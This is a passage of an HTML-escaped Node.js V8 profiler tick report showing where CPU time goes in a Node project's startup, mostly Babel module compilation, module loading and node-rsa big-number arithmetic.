 LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_overRest.js:17:18\n      1    0.1%    0.5%  LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;option-manager.js:158:33\n      1    0.1%    0.5%  LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;helpers&#x2F;merge.js:12:55\n      1    0.1%    0.5%  LazyCompile: *relative path.js:1161:30\n      1    0.1%    0.5%  LazyCompile: *montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      1    0.1%    0.5%  LazyCompile: *dirname path.js:1259:28\n      1    0.1%    0.5%  LazyCompile: *dataToArray &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;regenerate&#x2F;regenerate.js:476:28\n      1    0.1%    0.5%  LazyCompile: *bnpSubTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:402:18\n      1    0.1%    0.5%  LazyCompile: *bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1    0.1%    0.5%  LazyCompile: *basename path.js:1286:30\n      1    0.1%    0.5%  LazyCompile: *Module._nodeModulePaths internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:360:37\n      1    0.1%    0.5%  LazyCompile: *DoJoin native array.js:87:16\n      1    0.1%    0.5%  Builtin: ToString\n      1    0.1%    0.5%  Builtin: ToObject\n      1    0.1%    0.5%  Builtin: RegExpPrototypeExec\n      1    0.1%    0.5%  Builtin: RecordWrite\n      1    0.1%    0.5%  Builtin: ObjectAssign\n      1    0.1%    0.5%  Builtin: LoadIC_Uninitialized\n      1    0.1%    0.5%  Builtin: KeyedStoreIC\n      1    0.1%    0.5%  Builtin: KeyedLoadIC_Megamorphic\n      1    0.1%    0.5%  Builtin: JSConstructStubGeneric\n      1    0.1%    0.5%  Builtin: JSBuiltinsConstructStub\n      1    0.1%    0.5%  Builtin: IterableToList\n      1    0.1%    0.5%  Builtin: HasProperty\n      1    0.1%    0.5%  Builtin: GrowFastSmiOrObjectElements\n      1    0.1%    0.5%  Builtin: FindOrderedHashMapEntry\n      1    0.1%    0.5%  Builtin: CallFunction_ReceiverIsNullOrUndefined\n      1    0.1%    0.5%  Builtin: CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit\n      1    0.1%    0.5%  Builtin: ArrayPrototypePush\n      1    0.1%    0.5%  Builtin: ArgumentsAdaptorTrampoline\n\n [C++]:\n   ticks  total  nonlib   name\n\n [Summary]:\n   ticks  total  nonlib   name\n    196   17.9%   96.6%  JavaScript\n      0    0.0%    0.0%  C++\n     54    4.9%   26.6%  GC\n    894   81.5%          Shared libraries\n      7    0.6%          Unaccounted\n\n [C++ entry points]:\n   ticks    cpp   total   name\n\n [Bottom up (heavy) profile]:\n  Note: percentage shows a share of a particular caller in the total\n  amount of its parent calls.\n  Callers occupying less than 1.0% are not shown.\n\n   ticks parent  name\n    776   70.7%  &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n    725   93.4%    &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n    265   36.6%      LazyCompile: ~Script vm.js:44:14\n    265  100.0%        LazyCompile: ~createScript vm.js:273:22\n    265  100.0%          LazyCompile: ~runInThisContext vm.js:322:26\n    265  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n     46    6.3%      LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n     46  100.0%        LazyCompile: ~NativeModule.require internal&#x2F;bootstrap&#x2F;loaders.js:150:34\n      5   10.9%          LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      5  100.0%            LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n      4    8.7%          Script: ~&lt;anonymous&gt; util.js:1:11\n      4  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      3    6.5%          Script: ~&lt;anonymous&gt; stream.js:1:11\n      3  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      3    6.5%          Script: ~&lt;anonymous&gt; internal&#x2F;fs&#x2F;streams.js:1:11\n      3  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      2    4.3%          Script: ~&lt;anonymous&gt; internal&#x2F;process&#x2F;main_thread_only.js:1:11\n      2  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      2    4.3%          Script: ~&lt;anonymous&gt; internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:1:11\n      2  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      2    4.3%          Script: ~&lt;anonymous&gt; internal&#x2F;child_process.js:1:11\n      2  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      2    4.3%          Script: ~&lt;anonymous&gt; crypto.js:1:11\n      2  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      2    4.3%          Script: ~&lt;anonymous&gt; assert.js:1:11\n      2  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; tty.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; tls.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; internal&#x2F;util&#x2F;inspect.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; internal&#x2F;crypto&#x2F;cipher.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; internal&#x2F;cluster&#x2F;master.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; internal&#x2F;async_hooks.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; http.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; fs.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; child_process.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; buffer.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; _stream_wrap.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; _stream_readable.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; _http_common.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          Script: ~&lt;anonymous&gt; _http_client.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1    2.2%          LazyCompile: ~startup internal&#x2F;bootstrap&#x2F;node.js:30:19\n      1  100.0%            Script: ~bootstrapNodeJSCore internal&#x2F;bootstrap&#x2F;node.js:15:30\n      1    2.2%          LazyCompile: ~setupProcessObject internal&#x2F;bootstrap&#x2F;node.js:331:30\n      1  100.0%            LazyCompile: ~startup internal&#x2F;bootstrap&#x2F;node.js:30:19\n      1    2.2%          LazyCompile: ~setupInspector internal&#x2F;bootstrap&#x2F;node.js:442:26\n      1  100.0%            LazyCompile: ~setupGlobalConsole internal&#x2F;bootstrap&#x2F;node.js:404:30\n      1    2.2%          LazyCompile: ~setupGlobalTimeouts internal&#x2F;bootstrap&#x2F;node.js:394:31\n      1  100.0%            LazyCompile: ~startup internal&#x2F;bootstrap&#x2F;node.js:30:19\n      1    2.2%          LazyCompile: ~setupGlobalConsole internal&#x2F;bootstrap&#x2F;node.js:404:30\n      1  100.0%            LazyCompile: ~startup internal&#x2F;bootstrap&#x2F;node.js:30:19\n      1    2.2%          LazyCompile: ~lookupAndConnect net.js:934:26\n      1  100.0%            LazyCompile: ~Socket.connect net.js:878:36\n      1    2.2%          LazyCompile: ~createWritableStdioStream internal&#x2F;process&#x2F;stdio.js:158:35\n      1  100.0%            LazyCompile: ~getStdout internal&#x2F;process&#x2F;stdio.js:18:21\n     43    5.9%      LazyCompile: ~load &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:51:14\n     43  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:1:11\n     43  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n     43  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n     24    3.3%      LazyCompile: ~toString buffer.js:643:46\n     24  100.0%        Builtin: CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit\n     24  100.0%          LazyCompile: ~load &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:51:14\n     24  100.0%            Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:1:11\n     24    3.3%      LazyCompile: ~readPackage internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:153:21\n     24  100.0%        LazyCompile: ~tryPackage internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:174:20\n     24  100.0%          LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n     21   87.5%            LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      3   12.5%            LazyCompile: *Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n     20    2.8%      LazyCompile: ~stringify &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;fn&#x2F;json&#x2F;stringify.js:3:36\n     18   90.0%        LazyCompile: ~save &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:32:14\n     18  100.0%          LazyCompile: ~_tickCallback internal&#x2F;process&#x2F;next_tick.js:41:25\n     18  100.0%            LazyCompile: ~Module.runMain internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:741:26\n      2   10.0%        LazyCompile: ~compile &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:100:17\n      2  100.0%          LazyCompile: ~loader &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:143:16\n      2  100.0%            LazyCompile: ~require.extensions.(anonymous function) &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:150:38\n     17    2.3%      LazyCompile: ~stat internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:84:14\n     11   64.7%        LazyCompile: ~tryFile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:194:17\n      9   81.8%          LazyCompile: ~tryExtensions internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:209:23\n      9  100.0%            LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      2   18.2%          LazyCompile: ~tryPackage internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:174:20\n      2  100.0%            LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      6   35.3%        LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      6  100.0%          LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      6  100.0%            LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n     17    2.3%      LazyCompile: ~fromString buffer.js:334:20\n     17  100.0%        LazyCompile: ~from buffer.js:199:28\n     17  100.0%          LazyCompile: ~writeFileSync fs.js:1184:23\n     17  100.0%            LazyCompile: ~save &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:32:14\n     11    1.5%      LazyCompile: ~stringSlice buffer.js:589:21\n     11  100.0%        LazyCompile: ~toString buffer.js:643:46\n     11  100.0%          LazyCompile: ~readFileSync fs.js:340:22\n      7   63.6%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      2   18.2%            LazyCompile: ~Module._extensions..json internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:717:39\n      2   18.2%            LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;source-map-support&#x2F;source-map-support.js:64:35\n     10    1.4%      LazyCompile: ~byteLength buffer.js:509:20\n     10  100.0%        LazyCompile: ~fromString buffer.js:334:20\n     10  100.0%          LazyCompile: ~from buffer.js:199:28\n     10  100.0%            LazyCompile: ~writeFileSync fs.js:1184:23\n      8    1.1%      LazyCompile: ~Module._extensions..json internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:717:39\n      8  100.0%        LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      8  100.0%          LazyCompile: ~tryModuleLoad internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:536:23\n      8  100.0%            LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n\n     90    8.2%  &#x2F;usr&#x2F;lib64&#x2F;libc-2.17.so\n     57   63.3%    &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n      4    7.0%      Builtin: RegExpPrototypeExec\n      1   25.0%        LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:567:38\n      1  100.0%          LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:226:25\n      1  100.0%            LazyCompile: ~each &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:134:16\n      1   25.0%        LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:533:38\n      1  100.0%          LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:226:25\n      1  100.0%            LazyCompile: ~each &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:134:16\n      1   25.0%        LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:515:38\n      1  100.0%          LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:226:25\n      1  100.0%            LazyCompile: ~forOwn &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:168:18\n      1   25.0%        LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:500:38\n      1  100.0%          LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:226:25\n      1  100.0%            LazyCompile: ~each &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:134:16\n      2    3.5%      LazyCompile: ~load &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:51:14\n      2  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:1:11\n      2  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      2  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      2    3.5%      LazyCompile: ~am3 &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:102:13\n      2  100.0%        LazyCompile: ~bnpMultiplyTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:436:23\n      2  100.0%          LazyCompile: ~montMulTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:637:19\n      2  100.0%            LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      2    3.5%      LazyCompile: ~Module._extensions..json internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:717:39\n      2  100.0%        LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      2  100.0%          LazyCompile: ~tryModuleLoad internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:536:23\n      2  100.0%            LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      2    3.5%      LazyCompile: ~E internal&#x2F;errors.js:195:11\n      2  100.0%        Script: ~&lt;anonymous&gt; internal&#x2F;errors.js:1:11\n      2  100.0%          LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      2  100.0%            LazyCompile: ~NativeModule.require internal&#x2F;bootstrap&#x2F;loaders.js:150:34\n      2    3.5%      Builtin: ArrayForEach\n      1   50.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;wechat-api&#x2F;lib&#x2F;api_material.js:1:11\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1   50.0%        LazyCompile: ~_setExports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;assert-plus&#x2F;assert.js:98:21\n      1  100.0%          Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;assert-plus&#x2F;assert.js:1:11\n      1  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1    1.8%      Script: ~&lt;anonymous&gt; internal&#x2F;fixed_queue.js:1:11\n      1  100.0%        LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1  100.0%          LazyCompile: ~NativeModule.require internal&#x2F;bootstrap&#x2F;loaders.js:150:34\n      1  100.0%            LazyCompile: ~setupNextTick internal&#x2F;process&#x2F;next_tick.js:5:23\n      1    1.8%      Script: ~&lt;anonymous&gt; buffer.js:1:11\n      1  100.0%        LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1  100.0%          LazyCompile: ~NativeModule.require internal&#x2F;bootstrap&#x2F;loaders.js:150:34\n      1  100.0%            Script: ~&lt;anonymous&gt; util.js:1:11\n      1    1.8%      Script: ~&lt;anonymous&gt; :1:1\n      1    1.8%      Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;request&#x2F;index.js:1:11\n      1  100.0%        LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~require.extensions.(anonymous function) &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:150:38\n      1    1.8%      Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;mkdirp&#x2F;index.js:1:11\n      1  100.0%        LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1    1.8%      Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_createSet.js:1:11\n      1  100.0%        LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1    1.8%      Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;modules&#x2F;_uid.js:1:11\n      1  100.0%        LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1    1.8%      Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-types&#x2F;lib&#x2F;index.js:1:11\n      1  100.0%        LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1    1.8%      Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-types&#x2F;lib&#x2F;converters.js:1:11\n      1  100.0%        LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1    1.8%      Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-runtime&#x2F;helpers&#x2F;extends.js:1:11\n      1  100.0%        LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1    1.8%      LazyCompile: ~useColors &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;node_modules&#x2F;debug&#x2F;src&#x2F;node.js:73:19\n      1  100.0%        LazyCompile: ~createDebug &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;node_modules&#x2F;debug&#x2F;src&#x2F;debug.js:62:21\n      1  100.0%          Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;lib&#x2F;log4js.js:1:11\n      1  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1    1.8%      LazyCompile: ~thenCallback &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;join.js:13:32\n      1  100.0%        LazyCompile: ~module.exports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;join.js:3:9\n      1  100.0%          LazyCompile: ~module.exports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:2:26\n      1  100.0%            Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;bluebird.js:1:11\n      1    1.8%      LazyCompile: ~sync &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;mkdirp&#x2F;index.js:55:29\n      1  100.0%        LazyCompile: ~BaseRollingFileStream.openTheStream &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;streamroller&#x2F;lib&#x2F;BaseRollingFileStream.js:76:57\n      1  100.0%          LazyCompile: ~BaseRollingFileStream &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;streamroller&#x2F;lib&#x2F;BaseRollingFileStream.js:12:31\n      1  100.0%            LazyCompile: ~DateRollingFileStream &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;streamroller&#x2F;lib&#x2F;DateRollingFileStream.js:15:31\n      1    1.8%      LazyCompile: ~startup internal&#x2F;bootstrap&#x2F;node.js:30:19\n      1  100.0%        Script: ~bootstrapNodeJSCore internal&#x2F;bootstrap&#x2F;node.js:15:30\n      1    1.8%      LazyCompile: ~runInThisContext vm.js:114:19\n      1  100.0%        LazyCompile: ~runInThisContext vm.js:322:26\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1    1.8%      LazyCompile: ~resolve path.js:1068:28\n      1  100.0%        LazyCompile: ~Module._resolveLookupPaths internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:401:38\n      1  100.0%          LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1  100.0%            LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1    1.8%      LazyCompile: ~parseBuffer 